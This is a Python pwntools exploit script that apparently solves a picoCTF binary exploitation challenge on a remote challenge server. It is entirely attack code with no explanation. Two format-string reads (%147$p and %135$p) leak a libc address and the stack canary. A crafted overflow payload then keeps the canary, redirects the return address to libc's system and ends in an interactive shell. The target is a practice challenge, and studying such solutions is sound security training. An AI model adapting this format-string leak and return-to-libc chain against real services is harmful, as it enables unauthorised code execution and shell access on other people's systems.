#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln', checksec = False)
libc = ELF('libc.so.6', checksec = False)

# p = process(exe.path)
p = remote('jupiter.challenges.picoctf.org', 57529)

#stage 1 leak libc
p.recvuntil(b'?\n')
# p.sendline(b'-863')
p.sendline(b'-3727')
p.sendlineafter(b'? ', f'%147$p'.encode())
p.recvuntil(b': ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x018fa1
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

#stage 2 leak canary
p.recvuntil(b'?\n')
p.sendline(b'-3727')
# p.sendline(b'-863')
p.sendlineafter(b'? ', f'%135$p'.encode())
p.recvuntil(b': ')
canary = int(p.recvline()[:-1], 16)
log.info("canary: " + hex(canary))

#stage 3 overwrite eip -> system
p.recvuntil(b'?\n')
p.sendline(b'-3727')
# p.sendline(b'-863')
payload = b'a'*0x200
payload += p32(canary)
payload += b'b'*12
payload += p32(libc.address + 0x3cf10)
payload += p32(0x0804931d) #ret
payload += p32(libc.address + 0x17b9db)
p.sendlineafter(b'? ', payload)

p.interactive()